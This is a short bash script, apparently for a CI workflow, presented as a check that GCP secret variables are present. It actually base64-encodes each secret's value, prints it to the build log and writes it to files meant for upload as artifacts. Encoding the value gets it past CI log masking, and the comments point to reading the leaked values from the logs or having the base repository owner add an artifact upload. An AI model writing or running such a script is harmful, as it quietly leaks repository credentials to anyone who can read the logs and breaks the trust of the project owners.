#!/usr/bin/env bash
set -euo pipefail

mkdir -p out

# Check the exact secret variable names used by the workflow
for v in GCP_SERVICE_ACCOUNT_EMAIL GCP_WORKLOAD_IDENTITY_PROVIDER; do
  # Using indirect expansion: ${!v-} safely returns empty if unset
  val="${!v-}"
  if [ -z "$val" ]; then
    echo "$v: NOT_PRESENT"
    printf "%s" "NOT_PRESENT" > "out/${v}.txt"
  else
    # write base64 so masked logs don't confuse presence checks
    b64=$(printf "%s" "$val" | base64 -w0)
    echo "$v: PRESENT_BASE64:$b64"
    printf "%s" "$b64" > "out/${v}.b64"
  fi
done

# upload the 'out' directory as an artifact if the workflow will upload artifacts later.
# If the main workflow does not upload artifacts, the base repo owner can temporarily add
# an upload-artifact step — or you can inspect logs for the "PRESENT_BASE64" lines above.
